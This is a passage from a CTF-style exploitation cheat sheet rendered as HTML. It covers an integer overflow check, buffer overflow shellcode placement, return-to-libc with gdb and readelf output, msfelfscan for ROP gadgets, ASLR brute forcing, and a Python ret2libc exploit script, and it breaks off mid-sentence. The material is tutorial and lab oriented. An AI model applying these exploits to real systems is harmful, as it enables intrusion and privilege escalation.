<span class="w">    </span><span class="k">if</span><span class="p">(</span><span class="n">bid</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">1</span><span class="p">){</span>

<span class="w">        </span><span class="k">if</span><span class="p">(</span><span class="n">account_balance</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mi">100000</span><span class="p">){</span>
<span class="w">            </span><span class="n">print</span><span class="p">(</span><span class="s">&quot;Flag is XXX Read from file and print&quot;</span><span class="p">)</span>
<span class="w">        </span><span class="k">else</span><span class="p">{</span>
<span class="w">            </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\n</span><span class="s">Not enough funds for transaction</span><span class="se">\n\n\n</span><span class="s">&quot;</span><span class="p">);</span>
<span class="w">        </span><span class="p">}}</span>
</pre></div>
</div>
<p>In the above example, if we see our account_balance should be greater than <code class="docutils literal notranslate"><span class="pre">100000</span></code> (inital balance is <code class="docutils literal notranslate"><span class="pre">1000</span></code>). Here <code class="docutils literal notranslate"><span class="pre">total_cost</span></code> is int and having a range of <code class="docutils literal notranslate"><span class="pre">2,147,483,647</span></code>
As <code class="docutils literal notranslate"><span class="pre">total_cost</span> <span class="pre">=</span> <span class="pre">900*number_flags</span></code>, we can roughly calculate the number of flags to overflow totalcost by dividing <code class="docutils literal notranslate"><span class="pre">2,147,483,647</span></code> by <code class="docutils literal notranslate"><span class="pre">900</span></code></p>
</section>
<section id="buffer-overflow">
<h2>Buffer overflow<a class="headerlink" href="#buffer-overflow" title="Link to this heading"></a></h2>
<section id="executable-stack">
<h3>Executable Stack<a class="headerlink" href="#executable-stack" title="Link to this heading"></a></h3>
<p>Either you can put the shellcode on the buffer and then redirect the EIP to NOP Sled followed by the shellcode (provided the shellcode used is correct and the stack is executable).</p>
</section>
<section id="non-executable-stack-aslr-disabled">
<h3>Non-executable stack, ASLR Disabled<a class="headerlink" href="#non-executable-stack-aslr-disabled" title="Link to this heading"></a></h3>
<p>However, if the stack is not executable or the shellcode is not working (happens sometimes), then we can either,</p>
<section id="export-a-environment-variable">
<h4>Export a environment variable<a class="headerlink" href="#export-a-environment-variable" title="Link to this heading"></a></h4>
<ul class="simple">
<li><p>Export a environment variable with shellcode.</p></li>
<li><p>Find the address of env variable in the stack. Utilize getenvaddr.c to get the address of the environment variable</p></li>
</ul>
<blockquote>
<div><div class="highlight-c notranslate"><div class="highlight"><pre><span></span><span class="o">---</span><span class="n">getenvaddr</span><span class="p">.</span><span class="n">c</span><span class="o">---</span>

<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdlib.h&gt;</span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;string.h&gt;</span>

<span class="kt">int</span><span class="w"> </span><span class="n">main</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">argc</span><span class="p">,</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">argv</span><span class="p">[])</span><span class="w"> </span><span class="p">{</span>
<span class="w">       </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">ptr</span><span class="p">;</span>

<span class="w">       </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">argc</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">3</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">              </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Usage: %s &lt;environment var&gt; &lt;target program name&gt;</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
<span class="w">              </span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="w">       </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
<span class="w">               </span><span class="n">ptr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">getenv</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span><span class="w"> </span><span class="cm">/* Get environment variable location */</span>
<span class="w">               </span><span class="n">ptr</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="p">(</span><span class="n">strlen</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">strlen</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]))</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mi">2</span><span class="p">;</span><span class="w"> </span><span class="cm">/* Adjust for program name */</span>
<span class="w">               </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;%s will be at %p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span><span class="w"> </span><span class="n">ptr</span><span class="p">);</span>
<span class="w">       </span><span class="p">}</span>
<span class="w"> </span><span class="p">}</span>
</pre></div>
</div>
</div></blockquote>
<ul class="simple">
<li><p>Set the return address to starting of the shellcode</p></li>
<li><p>Get a shell</p></li>
</ul>
</section>
<section id="return2libc">
<h4>Return2libc<a class="headerlink" href="#return2libc" title="Link to this heading"></a></h4>
<p>Use return2libc which is a type of ROP</p>
<ul>
<li><p>Find the address of system function (Run “gdb -q ./program”; break main; p system)</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>gdb -q ./retlib
(no debugging symbols found)...(gdb)
(gdb) b main
Breakpoint 1 at 0x804859e
(gdb) r
Starting program: /home/c0ntex/retlib
(no debugging symbols found)...(no debugging symbols found)...
Breakpoint 1, 0x0804859e in main ()
(gdb) p system
$1 = {&lt;text variable, no debug info&gt;} 0x28085260 &lt;system&gt;
</pre></div>
</div>
</li>
<li><p>Find the address of “/bin/sh” in the stack or export it in the environment variable and execute it like system(“/bin/sh”). It is in the format of</p></li>
</ul>
<blockquote>
<div><div class="highlight-default notranslate"><div class="highlight"><pre><span></span> <span class="o">&lt;</span><span class="n">ADDRofSYSTEM</span><span class="o">&gt;</span> <span class="o">&lt;</span><span class="mi">4</span><span class="n">ArbitraryBytes</span> <span class="k">for</span> <span class="n">Return</span> <span class="n">Address</span><span class="o">&gt;</span> <span class="o">&lt;</span><span class="n">argument</span> <span class="k">for</span> <span class="n">system</span><span class="p">[</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">sh</span><span class="p">]</span><span class="o">&gt;</span>

<span class="mi">4</span><span class="n">Arbitrary</span> <span class="n">Bytes</span> <span class="k">for</span> <span class="n">Return</span> <span class="n">address</span> <span class="n">could</span> <span class="n">be</span> <span class="n">a</span> <span class="n">JUNK</span> <span class="n">address</span> <span class="ow">or</span> <span class="s2">&quot;</span><span class="se">\xCC\xCC\xCC\xCC</span><span class="s2">&quot;</span> <span class="ow">or</span> <span class="n">address</span> <span class="n">of</span> <span class="n">exit</span> <span class="n">function</span><span class="o">.</span>
</pre></div>
</div>
<p>The above pattern is because, when a function is called a stack frame is formed and the parameters for it are pushed onto the stack, followed by the return address(EIP) of your previous function along with your Stack Pointers(ebp, esp). with you Stack Pointer being on top of the frame.</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Top</span> <span class="n">of</span> <span class="n">stack</span>              <span class="n">lower</span> <span class="n">memory</span> <span class="n">address</span>

<span class="n">Buffer</span>
<span class="o">....</span>
<span class="n">Saved</span> <span class="n">Frame</span> <span class="n">Pointer</span> <span class="p">(</span><span class="n">EBP</span><span class="p">)</span>
<span class="n">Saved</span> <span class="n">Return</span> <span class="n">address</span> <span class="p">(</span><span class="n">EIP</span><span class="p">)</span>
<span class="n">Function</span><span class="p">()</span> <span class="n">arguments</span>
<span class="n">Function</span><span class="p">()</span> <span class="n">arguements</span>

<span class="n">Bottom</span> <span class="n">of</span> <span class="n">stack</span>          <span class="n">higher</span> <span class="n">memory</span> <span class="n">address</span>
</pre></div>
</div>
</div></blockquote>
<p>If Return Address set to</p>
<ul class="simple">
<li><p>\xCC\xCC\xCC\xCC so after system executes, it tries to return to 0xcccccccc. \xcc is good just to check if you’re actually jumping to your shellcode, but once you’ve verified that it works, then you should remove it. ret expects an address. not a payload, xCCxCCxCCxCC should be present as a payload.</p></li>
<li><p>If a JUNK address is put, the binary will have already executed the shellcode but it will segfault.</p></li>
<li><p>If the proper address of exit() is used, binary will exit cleanly.</p></li>
</ul>
<p>It’s better to use /bin/sh instead of /bin/bash since bash drops privs. If /bin/bash is used, it will launch /bin/bash but you’ll find that you haven’t elevated your privileges and this can get confusing. so either find another string that points to /bin/sh or set your own env variable like DASH=/bin/sh and reference that. Good paper to review is <a class="reference external" href="https://css.csail.mit.edu/6.858/2017/readings/return-to-libc.pdf">Bypassing non-executable-stack during Exploitation (return-to-libc)</a> and <a class="reference external" href="http://shellblade.net/docs/ret2libc.pdf">Performing a ret2libc Attack</a></p>
<ul class="simple">
<li><p>Sometimes you need to put a cat to keep the shell alive</p></li>
</ul>
<blockquote>
<div><div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="p">(</span><span class="n">cat</span> <span class="nb">input</span><span class="p">;</span> <span class="n">cat</span><span class="p">)</span> <span class="o">|</span> <span class="o">./</span><span class="n">binary</span> <span class="nb">input</span> <span class="ow">is</span> <span class="n">the</span> <span class="n">payload</span> <span class="n">you</span> <span class="n">are</span> <span class="n">sending</span><span class="o">.</span>
</pre></div>
</div>
</div></blockquote>
</section>
<section id="return-oriented-programming">
<h4>Return-Oriented Programming<a class="headerlink" href="#return-oriented-programming" title="Link to this heading"></a></h4>
<p>Msfelfscan can be used to locate interesting addresses within executable and linkable format (ELF) programs, which may prove useful in developing exploits.</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">framework2</span><span class="o">/</span><span class="n">msfelfscan</span> <span class="o">-</span><span class="n">f</span> <span class="n">stack7</span>
 <span class="n">Usage</span><span class="p">:</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">framework2</span><span class="o">/</span><span class="n">msfelfscan</span> <span class="o">&lt;</span><span class="nb">input</span><span class="o">&gt;</span> <span class="o">&lt;</span><span class="n">mode</span><span class="o">&gt;</span> <span class="o">&lt;</span><span class="n">options</span><span class="o">&gt;</span>
<span class="n">Inputs</span><span class="p">:</span>
        <span class="o">-</span><span class="n">f</span>  <span class="o">&lt;</span><span class="n">file</span><span class="o">&gt;</span>    <span class="n">Read</span> <span class="ow">in</span> <span class="n">ELF</span> <span class="n">file</span>
<span class="n">Modes</span><span class="p">:</span>
        <span class="o">-</span><span class="n">j</span>  <span class="o">&lt;</span><span class="n">reg</span><span class="o">&gt;</span>     <span class="n">Search</span> <span class="k">for</span> <span class="n">jump</span> <span class="n">equivalent</span> <span class="n">instructions</span>
        <span class="o">-</span><span class="n">s</span>            <span class="n">Search</span> <span class="k">for</span> <span class="n">pop</span><span class="o">+</span><span class="n">pop</span><span class="o">+</span><span class="n">ret</span> <span class="n">combinations</span>
        <span class="o">-</span><span class="n">x</span>  <span class="o">&lt;</span><span class="n">regex</span><span class="o">&gt;</span>   <span class="n">Search</span> <span class="k">for</span> <span class="n">regex</span> <span class="n">match</span>
        <span class="o">-</span><span class="n">a</span>  <span class="o">&lt;</span><span class="n">address</span><span class="o">&gt;</span> <span class="n">Show</span> <span class="n">code</span> <span class="n">at</span> <span class="n">specified</span> <span class="n">virtual</span> <span class="n">address</span>
<span class="n">Options</span><span class="p">:</span>
        <span class="o">-</span><span class="n">A</span>  <span class="o">&lt;</span><span class="n">count</span><span class="o">&gt;</span>   <span class="n">Number</span> <span class="n">of</span> <span class="nb">bytes</span> <span class="n">to</span> <span class="n">show</span> <span class="n">after</span> <span class="n">match</span>
        <span class="o">-</span><span class="n">B</span>  <span class="o">&lt;</span><span class="n">count</span><span class="o">&gt;</span>   <span class="n">Number</span> <span class="n">of</span> <span class="nb">bytes</span> <span class="n">to</span> <span class="n">show</span> <span class="n">before</span> <span class="n">match</span>
        <span class="o">-</span><span class="n">I</span>  <span class="n">address</span>   <span class="n">Specify</span> <span class="n">an</span> <span class="n">alternate</span> <span class="n">base</span> <span class="n">load</span> <span class="n">address</span>
        <span class="o">-</span><span class="n">n</span>            <span class="n">Print</span> <span class="n">disassembly</span> <span class="n">of</span> <span class="n">matched</span> <span class="n">data</span>
</pre></div>
</div>
<p>We can use msfelfscan to get pop-pop-retun, choose that address and use</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">pop</span><span class="o">-</span><span class="n">pop</span><span class="o">-</span><span class="n">ret</span><span class="o">-</span><span class="n">addr</span> <span class="o">|</span> <span class="mi">8</span> <span class="nb">bytes</span> <span class="n">junk</span> <span class="o">|</span> <span class="n">address</span> <span class="n">to</span> <span class="n">execute</span> <span class="o">|</span>

<span class="n">where</span> <span class="n">address</span><span class="o">-</span><span class="n">to</span><span class="o">-</span><span class="n">execute</span> <span class="ow">is</span> <span class="n">the</span> <span class="n">address</span> <span class="n">of</span> <span class="n">the</span> <span class="n">environment</span> <span class="n">variable</span> <span class="n">where</span> <span class="n">shellcode</span> <span class="ow">is</span> <span class="n">stored</span><span class="o">.</span>
</pre></div>
</div>
</section>
</section>
<section id="non-executable-stack-aslr-enabled">
<h3>Non-Executable Stack, ASLR Enabled<a class="headerlink" href="#non-executable-stack-aslr-enabled" title="Link to this heading"></a></h3>
<p>If the aslr is enabled, the address for the libc would change everytime, the binary is executed.</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>for i in `seq 1 5`; do ldd ovrflw | grep libc; done
       libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xb762f000)
       libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xb758f000)
       libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xb75ae000)
</pre></div>
</div>
<p>However, if we notice the libc address in not changing much, first three characters and last three characters remain the same. Because, the machine we are doing would be probably a CTF machine, so we can brute-force the possible libc address. It is suggested to figure out the offset of system, exit and string “/bin/sh” from the libc base address. Remember,</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="o">&lt;</span><span class="n">ADDRofSYSTEM</span><span class="o">&gt;</span> <span class="o">&lt;</span><span class="mi">4</span><span class="n">ArbitraryBytes</span> <span class="k">for</span> <span class="n">Return</span> <span class="n">Address</span><span class="o">&gt;</span> <span class="o">&lt;</span><span class="n">argument</span> <span class="k">for</span> <span class="n">system</span><span class="p">[</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">sh</span><span class="p">]</span><span class="o">&gt;</span>
</pre></div>
</div>
<section id="find-the-offset-of-system-exit-and-bin-sh">
<h4>Find the offset of system, exit and /bin/sh<a class="headerlink" href="#find-the-offset-of-system-exit-and-bin-sh" title="Link to this heading"></a></h4>
<p>System</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">readelf</span> <span class="o">-</span><span class="n">s</span> <span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">i386</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">gnu</span><span class="o">/</span><span class="n">libc</span><span class="o">.</span><span class="n">so</span><span class="mf">.6</span> <span class="o">|</span> <span class="n">grep</span> <span class="n">system</span>
  <span class="mi">246</span><span class="p">:</span> <span class="mi">00113</span><span class="n">d70</span>    <span class="mi">68</span> <span class="n">FUNC</span>    <span class="n">GLOBAL</span> <span class="n">DEFAULT</span>   <span class="mi">13</span> <span class="n">svcerr_systemerr</span><span class="o">@</span><span class="nd">@GLIBC_2</span><span class="mf">.0</span>
  <span class="mi">628</span><span class="p">:</span> <span class="mi">0003</span><span class="n">ab40</span>    <span class="mi">55</span> <span class="n">FUNC</span>    <span class="n">GLOBAL</span> <span class="n">DEFAULT</span>   <span class="mi">13</span> <span class="n">__libc_system</span><span class="o">@</span><span class="nd">@GLIBC_PRIVATE</span>
 <span class="mi">1461</span><span class="p">:</span> <span class="mi">0003</span><span class="n">ab40</span>    <span class="mi">55</span> <span class="n">FUNC</span>    <span class="n">WEAK</span>   <span class="n">DEFAULT</span>   <span class="mi">13</span> <span class="n">system</span><span class="o">@</span><span class="nd">@GLIBC_2</span><span class="mf">.0</span>
</pre></div>
</div>
<p>Exit function</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">readelf</span> <span class="o">-</span><span class="n">s</span> <span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">i386</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">gnu</span><span class="o">/</span><span class="n">libc</span><span class="o">.</span><span class="n">so</span><span class="mf">.6</span> <span class="o">|</span> <span class="n">grep</span> <span class="n">exit</span>
  <span class="mi">112</span><span class="p">:</span> <span class="mi">0002</span><span class="n">ec00</span>    <span class="mi">39</span> <span class="n">FUNC</span>    <span class="n">GLOBAL</span> <span class="n">DEFAULT</span>   <span class="mi">13</span> <span class="n">__cxa_at_quick_exit</span><span class="o">@</span><span class="nd">@GLIBC_2</span><span class="mf">.10</span>
  <span class="mi">141</span><span class="p">:</span> <span class="mf">0002e7</span><span class="n">f0</span>    <span class="mi">33</span> <span class="n">FUNC</span>    <span class="n">GLOBAL</span> <span class="n">DEFAULT</span>   <span class="mi">13</span> <span class="n">exit</span><span class="o">@</span><span class="nd">@GLIBC_2</span><span class="mf">.0</span>
  <span class="mi">451</span><span class="p">:</span> <span class="mi">0002</span><span class="n">ec30</span>   <span class="mi">181</span> <span class="n">FUNC</span>    <span class="n">GLOBAL</span> <span class="n">DEFAULT</span>   <span class="mi">13</span> <span class="n">__cxa_thread_atexit_impl</span><span class="o">@</span><span class="nd">@GLIBC_2</span><span class="mf">.18</span>
  <span class="mi">559</span><span class="p">:</span> <span class="mi">000</span><span class="n">b1645</span>    <span class="mi">24</span> <span class="n">FUNC</span>    <span class="n">GLOBAL</span> <span class="n">DEFAULT</span>   <span class="mi">13</span> <span class="n">_exit</span><span class="o">@</span><span class="nd">@GLIBC_2</span><span class="mf">.0</span>
  <span class="mi">617</span><span class="p">:</span> <span class="mi">00116</span><span class="n">de0</span>    <span class="mi">56</span> <span class="n">FUNC</span>    <span class="n">GLOBAL</span> <span class="n">DEFAULT</span>   <span class="mi">13</span> <span class="n">svc_exit</span><span class="o">@</span><span class="nd">@GLIBC_2</span><span class="mf">.0</span>
  <span class="mi">652</span><span class="p">:</span> <span class="mi">00120</span><span class="n">b60</span>    <span class="mi">33</span> <span class="n">FUNC</span>    <span class="n">GLOBAL</span> <span class="n">DEFAULT</span>   <span class="mi">13</span> <span class="n">quick_exit</span><span class="nd">@GLIBC_2</span><span class="mf">.10</span>
  <span class="mi">654</span><span class="p">:</span> <span class="mi">0002</span><span class="n">ebd0</span>    <span class="mi">33</span> <span class="n">FUNC</span>    <span class="n">GLOBAL</span> <span class="n">DEFAULT</span>   <span class="mi">13</span> <span class="n">quick_exit</span><span class="o">@</span><span class="nd">@GLIBC_2</span><span class="mf">.24</span>
  <span class="mi">878</span><span class="p">:</span> <span class="mi">0002</span><span class="n">ea20</span>    <span class="mi">85</span> <span class="n">FUNC</span>    <span class="n">GLOBAL</span> <span class="n">DEFAULT</span>   <span class="mi">13</span> <span class="n">__cxa_atexit</span><span class="o">@</span><span class="nd">@GLIBC_2</span><span class="mf">.1.3</span>
 <span class="mi">1048</span><span class="p">:</span> <span class="mi">00120</span><span class="n">b20</span>    <span class="mi">52</span> <span class="n">FUNC</span>    <span class="n">GLOBAL</span> <span class="n">DEFAULT</span>   <span class="mi">13</span> <span class="n">atexit</span><span class="nd">@GLIBC_2</span><span class="mf">.0</span>
 <span class="mi">1398</span><span class="p">:</span> <span class="mi">001</span><span class="n">b3204</span>     <span class="mi">4</span> <span class="n">OBJECT</span>  <span class="n">GLOBAL</span> <span class="n">DEFAULT</span>   <span class="mi">33</span> <span class="n">argp_err_exit_status</span><span class="o">@</span><span class="nd">@GLIBC_2</span><span class="mf">.1</span>
 <span class="mi">1510</span><span class="p">:</span> <span class="mi">000</span><span class="n">f4130</span>    <span class="mi">58</span> <span class="n">FUNC</span>    <span class="n">GLOBAL</span> <span class="n">DEFAULT</span>   <span class="mi">13</span> <span class="n">pthread_exit</span><span class="o">@</span><span class="nd">@GLIBC_2</span><span class="mf">.0</span>
 <span class="mi">2112</span><span class="p">:</span> <span class="mi">001</span><span class="n">b3150</span>     <span class="mi">4</span> <span class="n">OBJECT</span>  <span class="n">GLOBAL</span> <span class="n">DEFAULT</span>   <span class="mi">33</span> <span class="n">obstack_exit_failure</span><span class="o">@</span><span class="nd">@GLIBC_2</span><span class="mf">.0</span>
 <span class="mi">2267</span><span class="p">:</span> <span class="mf">0002e820</span>    <span class="mi">78</span> <span class="n">FUNC</span>    <span class="n">WEAK</span>   <span class="n">DEFAULT</span>   <span class="mi">13</span> <span class="n">on_exit</span><span class="o">@</span><span class="nd">@GLIBC_2</span><span class="mf">.0</span>
 <span class="mi">2410</span><span class="p">:</span> <span class="mi">000</span><span class="n">f54f0</span>     <span class="mi">2</span> <span class="n">FUNC</span>    <span class="n">GLOBAL</span> <span class="n">DEFAULT</span>   <span class="mi">13</span> <span class="n">__cyg_profile_func_exit</span><span class="o">@</span><span class="nd">@GLIBC_2</span><span class="mf">.2</span>
</pre></div>
</div>
<p>String /bin/sh</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">strings</span> <span class="o">-</span><span class="n">a</span> <span class="o">-</span><span class="n">t</span> <span class="n">x</span> <span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">i386</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">gnu</span><span class="o">/</span><span class="n">libc</span><span class="o">.</span><span class="n">so</span><span class="mf">.6</span> <span class="o">|</span> <span class="n">grep</span> <span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">sh</span>
<span class="mi">15</span><span class="n">cdc8</span> <span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">sh</span>
</pre></div>
</div>
<p>Now, we know the offset of the system, exit and /bin/sh</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span> <span class="mi">1461</span><span class="p">:</span> <span class="mi">0003</span><span class="n">ab40</span>    <span class="mi">55</span> <span class="n">FUNC</span>    <span class="n">WEAK</span>   <span class="n">DEFAULT</span>   <span class="mi">13</span> <span class="n">system</span><span class="o">@</span><span class="nd">@GLIBC_2</span><span class="mf">.0</span>
  <span class="mi">141</span><span class="p">:</span> <span class="mf">0002e7</span><span class="n">f0</span>    <span class="mi">33</span> <span class="n">FUNC</span>    <span class="n">GLOBAL</span> <span class="n">DEFAULT</span>   <span class="mi">13</span> <span class="n">exit</span><span class="o">@</span><span class="nd">@GLIBC_2</span><span class="mf">.0</span>
<span class="mi">15</span><span class="n">cdc8</span> <span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">sh</span>
</pre></div>
</div>
</section>
<section id="creation-of-exploit">
<h4>Creation of exploit<a class="headerlink" href="#creation-of-exploit" title="Link to this heading"></a></h4>
<p>Now, when we have the offset, let’s take a sample libc address and create the exploit</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">subprocess</span> <span class="kn">import</span> <span class="n">call</span>
<span class="kn">import</span> <span class="nn">struct</span>

<span class="c1">#---Offsets of System, Exit and /bin/sh</span>
<span class="n">libc_base_addr</span> <span class="o">=</span> <span class="mh">0xb75e6000</span>
<span class="n">system_offset</span>  <span class="o">=</span> <span class="mh">0x0003ab40</span>
<span class="n">exit_offset</span>    <span class="o">=</span> <span class="mh">0x0002e7f0</span>
<span class="n">binsh_offset</span>   <span class="o">=</span> <span class="mh">0x0015cdc8</span>

<span class="c1">#---Calculation of System, Exit, binsh addr</span>
<span class="n">system_addr</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;&lt;I&quot;</span><span class="p">,</span><span class="n">libc_base_addr</span> <span class="o">+</span> <span class="n">system_offset</span><span class="p">)</span>
<span class="n">exit_addr</span>   <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;&lt;I&quot;</span><span class="p">,</span><span class="n">libc_base_addr</span> <span class="o">+</span> <span class="n">exit_offset</span><span class="p">)</span>
<span class="n">binsh_addr</span>  <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;&lt;I&quot;</span><span class="p">,</span><span class="n">libc_base_addr</span> <span class="o">+</span> <span class="n">binsh_offset</span><span class="p">)</span>

<span class="c1">#---Creating the payload</span>
<span class="n">buf</span> <span class="o">=</span> <span class="s2">&quot;A&quot;</span> <span class="o">*</span> <span class="mi">112</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="n">system_addr</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="n">exit_addr</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="n">binsh_addr</span>
</pre></div>
</div>
</section>
<section id="calling-the-targetted-binary-multiple-times">
<h4>Calling the targetted binary multiple times<a class="headerlink" href="#calling-the-targetted-binary-multiple-times" title="Link to this heading"></a></h4>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="c1">#---Execution of the binary multiple times</span>
<span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="k">while</span><span class="p">(</span><span class="n">i</span><span class="o">&lt;</span><span class="mi">512</span><span class="p">):</span>
  <span class="nb">print</span> <span class="s2">&quot;Try :</span><span class="si">%s</span><span class="s2">&quot;</span> <span class="o">%</span><span class="n">i</span>
  <span class="n">i</span> <span class="o">=</span> <span class="n">i</span><span class="o">+</span><span class="mi">1</span>
  <span class="n">ret</span> <span class="o">=</span> <span class="n">call</span><span class="p">([</span><span class="s2">&quot;/usr/local/bin/ovrflw&quot;</span><span class="p">,</span><span class="n">buf</span><span class="p">])</span>
</pre></div>
</div>
<ul class="simple">
<li><p>Sometimes we need a shellcode to write a string or for getting a actual shell. A good reference can be found <a class="reference external" href="https://www.exploit-db.com/raw/13224/">Introduction to Writing Shellcode</a> Information about various system call integar value need to be present in EAX register is <a class="reference external" href="https://syscalls.kernelgrok.com/">Linux System Call Table</a></p></li>
</ul>
<blockquote>
<div><p>Let’s see a small example where we move an address to eax register and jump to it. Address which we are moving to eax would contain our shellcode.</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="p">;</span><span class="n">test</span><span class="o">.</span><span class="n">asm</span>
<span class="p">[</span><span class="n">SECTION</span> <span class="o">.</span><span class="n">text</span><span class="p">]</span>
<span class="k">global</span> <span class="n">_start</span>
<span class="n">_start</span><span class="p">:</span>
        <span class="n">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="mh">0xffffd8bc</span>
      <span class="n">jmp</span> <span class="n">eax</span>
</pre></div>
</div>
<p>Just good to know: global directive is NASM specific. It is for exporting symbols in your code to where it points in the object code generated. Here you mark _start symbol global so its name is added in the object code (a.o). The linker (ld) can read that symbol in the object code and its value so it knows where to mark as an entry point in the output executable. When you run the executable it starts at where marked as _start in the code.</p>
<p>If a global directive missing for a symbol that symbol will not be placed in the object code’s export table so linker has no way of knowing about the symbol. We can compile the asm file by</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">nasm</span> <span class="o">-</span><span class="n">f</span> <span class="n">elf</span> <span class="n">test</span><span class="o">.</span><span class="n">asm</span>
</pre></div>
</div>
<p>link it</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">ld</span> <span class="o">-</span><span class="n">o</span> <span class="n">test</span> <span class="n">test</span><span class="o">.</span><span class="n">o</span>
</pre></div>
</div>
<p>If you get the below error</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>ld: i386 architecture of input file `test.o&#39; is incompatible with i386:x86-64 output
</pre></div>
</div>
<p>either</p>
<p>Use 64 bits instead of 32 for your loader and compile it with the following command:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">nasm</span> <span class="o">-</span><span class="n">f</span> <span class="n">elf64</span> <span class="n">loader</span><span class="o">.</span><span class="n">asm</span> <span class="o">-</span><span class="n">o</span> <span class="n">loader</span><span class="o">.</span><span class="n">o</span>
</pre></div>
</div>
<p>or</p>
<p>If want compile the file as 32 bits composition, you can use:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">ld</span> <span class="o">-</span><span class="n">m</span> <span class="n">elf_i386</span> <span class="o">-</span><span class="n">s</span> <span class="o">-</span><span class="n">o</span> <span class="n">file</span><span class="o">.</span><span class="n">o</span> <span class="n">file</span>
</pre></div>
</div>
<p>To see the byte code</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">objdump</span> <span class="o">-</span><span class="n">d</span> <span class="o">&lt;</span><span class="n">file</span><span class="o">&gt;</span>
</pre></div>
</div>
</div></blockquote>
<ul class="simple">
<li><p>What we mostly do when exploiting a buffer overflow (when placing the shellcode on stack) is we place our shellcode before EIP, we should also check if we can put our shellcode after EIP. This is particularly useful when some kind of check for shellcode is present in address before EIP. Example: Suppose our EIP is present at offset 80. We would usually do</p></li>
</ul>
<blockquote>
